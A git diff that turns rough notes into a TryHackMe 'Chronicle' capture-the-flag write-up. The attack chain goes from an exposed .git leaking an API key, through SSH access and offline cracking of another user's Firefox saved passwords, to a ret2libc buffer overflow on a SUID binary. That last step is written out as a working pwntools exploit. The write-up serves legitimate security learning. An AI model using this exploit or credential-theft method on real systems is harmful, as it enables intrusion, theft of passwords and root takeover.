@@ -1,73 +1,148 @@
-Stuff That I Learned: 
-1. Fuzz More
-2. command: git log to see commit history
-3. scp tool 
-4. .mozilla folder is IMPORTANT
+# Chronicle — TryHackMe Writeup
 
+> **TL;DR:** Exposed `.git` directory leaked an API key → credentials
+> retrieved → SSH access → Firefox credentials cracked → SUID binary
+> exploited via ret2libc → root shell
 
+---
 
-found port 80(old) and 8081(new)
+## Introduction
+Chronicle is a medium-difficulty TryHackMe room that chains together
+web enumeration, credential discovery, and binary exploitation to
+achieve root. What makes this room interesting is that each step
+naturally flows into the next — nothing feels forced.
 
-i can retrieve passwords by entering usernames but i doesn't work because of missing API Key
+---
 
-Fuzz showed gold .git on the old 80 port website
+## Recon
+Starting with a port scan revealed two web services running side by side...
 
-need to find username and API Key
-![[Pasted image 20260614161729.png|557]]
+The newer site on **8081** had a password retrieval feature, but it
+required an API key I didn't have yet. So I turned my attention to
+the older site on **80**.
 
+Fuzzing for hidden directories revealed something interesting:
+\```bash
+ffuf -u http://<ip>/.FUZZ -w /usr/share/wordlists/dirb/common.txt
+# Found: .git
+\```
 
-seeing commits, one of them showed the hidden API Key
-![[Pasted image 20260614161515.png|554]]
+A `.git` directory exposed on a web server means one thing —
+the entire commit history is accessible.
 
-trying the username and API key i found, IT WORKED! it returned the username and password
-![[Pasted image 20260614161935.png|572]]
+---
 
-i can also look for more usernames with ffuf
-![[Pasted image 20260614162600.png]]
+## Credential Discovery
+Enumerating the git history:
+\```bash
+git log        # list all commits
+git show <id>  # inspect suspicious commit
+\```
 
-login page doesn't seem to work so we try SSH mayber?
-![[Pasted image 20260614162208.png|549]]
+One commit contained a hardcoded API key that was later removed —
+but git never forgets. Armed with the API key and a username,
+the retrieval endpoint returned valid credentials.
 
-using tommy username and password to login via SSH, it worked and i'm insied tommy's machine
-![[Pasted image 20260614163310.png|538]]![[Pasted image 20260614163352.png|437]]
+---
 
-BOOM! The first flag, user.txt
-![[Pasted image 20260614163447.png]]
+## Initial Access — tommy
+With credentials in hand, SSH gave us a foothold:
+\```bash
+ssh tommy@<ip>
+cat user.txt  # first flag!
+\```
 
-found another user called carlJ and his folder contain a hidden .mozzila folder
-![[Pasted image 20260614174857.png|550]]
+---
 
-.mozzila files can contain sensitive data and i will use a tool called firefox-decrypt and downloading the firefox folder inside the .mozilla on my local machine via scp tool
+## Lateral Movement — carlJ
+Enumerating the system revealed another user, **carlJ**, with
+a `.mozilla` folder — Firefox profiles store saved passwords
+in encrypted form, but they can be decrypted offline.
 
-![[Pasted image 20260614175438.png]]
+Transferred the profile to my local machine:
+\```bash
+scp -r tommy@<ip>:/home/carlJ/.mozilla/firefox ./firefox
+\```
 
+Used `firefox_decrypt` but it required a master password.
+Rather than guess manually, I automated it with a Python script
+that tried each password from rockyou.txt until it succeeded.
 
-choosing option one will show that this isn't a valid profile 
-![[Pasted image 20260614175706.png]]
+Found carlJ's password and SSHed in.
 
-option 2 is the right choice  but requires a password but how to fuzz this? Automation is the answer
-![[Pasted image 20260614175555.png]]
+---
 
-made a script using python where when the tool runs and ask for a choice it choses option 2 automatically and when it asks for a password it uses a wordlist until it hits a bingo.
- 
- Script:![[cracker.py]]
- ![[Pasted image 20260614180223.png]]
+## Privilege Escalation — ret2libc Buffer Overflow
+Inside carlJ's home directory was a `mailing/` folder containing
+a SUID binary called `smail`. Running it showed two options —
+Send Message and Change Signature.
 
-BOOM AGAIN! found the password
-![[Pasted image 20260614180349.png|451]]
+The word "signature" with no visible limit is a red flag for
+buffer overflow.
 
-Let's try SSH carlJ using this password, Success!
-![[Pasted image 20260614180519.png|609]]
+### Binary Analysis
+\```bash
+checksec --file=./smail
+\```
+\```
+NX:    enabled   → shellcode won't work, need ret2libc
+PIE:   disabled  → gadget addresses are static
+Stack: no canary → can overflow freely
+\```
 
-Finally entered the mailing folder and found smail app
-![[Pasted image 20260614180751.png|517]]
+### Finding the Offset
+The buffer was **64 bytes** + **8 bytes** for RBP = **72 bytes**
+before we control the return address.
 
-opening it and seeing the option we can see that it can be a buffer overflow vulnerability
-![[Pasted image 20260614182542.png|479]]
+### Building the ROP Chain
+Since NX is enabled we can't run shellcode. Instead we:
+1. Return into `system()` from libc
+2. Pass `/bin/sh` as the argument via the `pop rdi` gadget
 
-using string we can get more information and know more about the program
-![[Pasted image 20260614182721.png|528]]
-it's a 64 bit program and it's clear that it has a setuid binary that can be exploited
+\```
+[72 x 'A'][ret gadget][pop rdi][/bin/sh address][system()]
+     |           |          |           |              |
+  overflow   alignment   set RDI    argument       shell!
+\```
 
-let's craft an exploit for this program via ret2libc notes
-![[Pasted image 20260614183018.png|532]]
+The `ret` gadget is needed for 16-byte stack alignment —
+without it `system()` crashes on a `movaps` instruction.
+
+### Exploit
+\```python
+from pwn import *
+
+p = process('./smail')
+
+libc_base = 0x7ffff79e2000
+system    = libc_base + 0x4f550
+binsh     = libc_base + 0x1b3e1a
+POP_RDI   = 0x4007f3
+RET       = 0x400556
+
+payload  = b'A' * 72
+payload += p64(RET)
+payload += p64(POP_RDI)
+payload += p64(binsh)
+payload += p64(system)
+
+p.sendlineafter(b'What do you wanna do', b'2')
+p.sendlineafter(b'Write your signature...', payload)
+p.interactive()
+\```
+
+---
+
+## Conclusion
+Chronicle was a great room for chaining multiple techniques together.
+The key takeaways:
+- Always fuzz for `.git` directories on web servers
+- Firefox profiles are goldmines for credentials
+- SUID binaries with unchecked input are privesc gold
+
+## What I Learned
+- `git log` for commit history enumeration
+- `scp` for file transfers
+- Firefox credential decryption
+- ret2libc buffer overflow exploitation
+- ROP chains and stack alignment in 64-bit
